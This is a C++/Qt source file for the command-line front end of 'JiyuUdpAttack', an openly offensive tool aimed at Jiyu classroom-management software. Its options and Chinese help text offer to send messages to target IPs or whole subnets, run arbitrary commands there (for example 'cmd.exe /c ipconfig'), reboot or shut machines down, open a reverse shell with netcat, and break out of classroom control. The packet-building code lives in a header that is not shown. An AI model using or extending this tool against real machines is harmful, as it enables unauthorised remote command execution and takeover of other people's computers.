#include <QCoreApplication>
#include <QCommandLineParser>
#include <QCommandLineOption>
#include <QDebug>
#include <QProcess>
#include <QThread>
#include <QTimer>
#include <random>
#include "jiyuudpattack.h"

void printHeader()
{
    qDebug() << "";
    qDebug() << "    ---------------------------------------------------";
    qDebug() << "    ------------------- Github Repositories -------------------";
    qDebug() << "                    详细说明请看项目文档";
    qDebug() << "            https://github.com/ht0Ruial/Jiyu_udp_attack";
    qDebug() << "    ---------------------------------------------------";
    qDebug() << "";
}

void printError(const QString &error)
{
    qDebug() << "[-] error:" << error;
}

void printHelp()
{
    qDebug() << "使用方法:";
    qDebug() << "  -ip <IP>          指定目标 IP 地址 (支持 192.168.1.10-56 或 192.168.1.1/24)";
    qDebug() << "  -p <port>         指定监听端口，默认端口为 4705";
    qDebug() << "  -msg <message>    发送消息 eg: -msg \"Hello World!\"";
    qDebug() << "  -c <command>      执行命令 eg: -c \"cmd.exe /c ipconfig\"";
    qDebug() << "  -l <count>        循环次数，默认为 1";
    qDebug() << "  -t <interval>     循环时间间隔，默认是 22 秒";
    qDebug() << "  -e <option>       额外选项：r(重启), s(关机), g(获取信息), nc(反弹 shell), break(脱离控制), continue(恢复控制)";
    qDebug() << "  -ncport <port>    反弹 shell 的端口 (可选，默认随机)";
    qDebug() << "  -h, --help        显示帮助信息";
}

int main(int argc, char *argv[])
{
    QCoreApplication app(argc, argv);
    QCoreApplication::setApplicationName("JiyuUdpAttack");
    QCoreApplication::setApplicationVersion("1.0");
    
    printHeader();
    
    QCommandLineParser parser;
    parser.setApplicationDescription("Jiyu UDP Attack Tool - Qt C++ Version");
    parser.addHelpOption();
    parser.addVersionOption();
    
    QCommandLineOption ipOption(QStringList() << "ip", "指定目标 IP 地址", "IP");
    parser.addOption(ipOption);
    
    QCommandLineOption portOption(QStringList() << "p", "指定监听端口", "port", "4705");
    parser.addOption(portOption);
    
    QCommandLineOption msgOption(QStringList() << "msg", "发送消息", "message");
    parser.addOption(msgOption);
    
    QCommandLineOption cmdOption(QStringList() << "c", "执行命令", "command");
    parser.addOption(cmdOption);
    
    QCommandLineOption loopOption(QStringList() << "l", "循环次数", "count", "1");
    parser.addOption(loopOption);
    
    QCommandLineOption intervalOption(QStringList() << "t", "循环时间间隔 (秒)", "interval", "22");
    parser.addOption(intervalOption);
    
    QCommandLineOption extraOption(QStringList() << "e", "额外选项：r(重启), s(关机), g(获取信息), nc(反弹 shell), break(脱离控制), continue(恢复控制)", "option");
    parser.addOption(extraOption);
    
    QCommandLineOption ncPortOption(QStringList() << "ncport", "反弹 shell 端口", "ncport", "0");
    parser.addOption(ncPortOption);
    
    parser.process(app);
    
    QString targetIp = parser.value(ipOption);
    int port = parser.value(portOption).toInt();
    QString message = parser.value(msgOption);
    QString command = parser.value(cmdOption);
    int loopCount = parser.value(loopOption).toInt();
    int loopInterval = parser.value(intervalOption).toInt();
    QString extra = parser.value(extraOption);
    int ncPort = parser.value(ncPortOption).toInt();
    
    if (!parser.isSet(ipOption) && !parser.isSet(extraOption) && !parser.isSet(msgOption) && !parser.isSet(cmdOption)) {
        printHelp();
        return 1;
    }
    
    JiyuUdpAttack attacker;
    
    QObject::connect(&attacker, &JiyuUdpAttack::statusMessage, [](const QString &msg) {
        qDebug() << "[*]" << msg;
    });
    
    QObject::connect(&attacker, &JiyuUdpAttack::errorOccurred, [](const QString &error) {
        printError(error);
    });
    
    QObject::connect(&attacker, &JiyuUdpAttack::attackCompleted, [&app]() {
        QTimer::singleShot(100, &app, &QCoreApplication::quit);
    });
    
    attacker.setPort(port);
    attacker.setLoopCount(loopCount);
    attacker.setLoopInterval(loopInterval);
    
    if (!extra.isEmpty()) {
        if (extra == "g") {
            attacker.getLocalInfo();
        } else if (extra == "break") {
            attacker.breakControl();
        } else if (extra == "continue") {
            attacker.continueControl();
        } else if (extra == "r") {
            if (!targetIp.isEmpty()) {
                attacker.setTargetIp(targetIp);
                attacker.reboot();
            } else {
                printError("重启需要指定 IP 地址");
                return 1;
            }
        } else if (extra == "s") {
            if (!targetIp.isEmpty()) {
                attacker.setTargetIp(targetIp);
                attacker.shutdown();
            } else {
                printError("关机需要指定 IP 地址");
                return 1;
            }
        } else if (extra == "nc") {
            if (!targetIp.isEmpty()) {
                attacker.setTargetIp(targetIp);
                attacker.netcat(ncPort);
            } else {
                printError("反弹 shell 需要指定 IP 地址");
                return 1;
            }
        }
    } else {
        if (!targetIp.isEmpty()) {
            attacker.setTargetIp(targetIp);
        }
        
        bool hasAction = false;
        
        if (!message.isEmpty()) {
            attacker.attackWithMessage(message);
            hasAction = true;
        }
        
        if (!command.isEmpty()) {
            attacker.attackWithCommand(command);
            hasAction = true;
        }
        
        if (!hasAction && !targetIp.isEmpty()) {
            printError("请使用 -msg 或 -c 参数指定要执行的操作");
            printHelp();
            return 1;
        }
    }
    
    return app.exec();
}
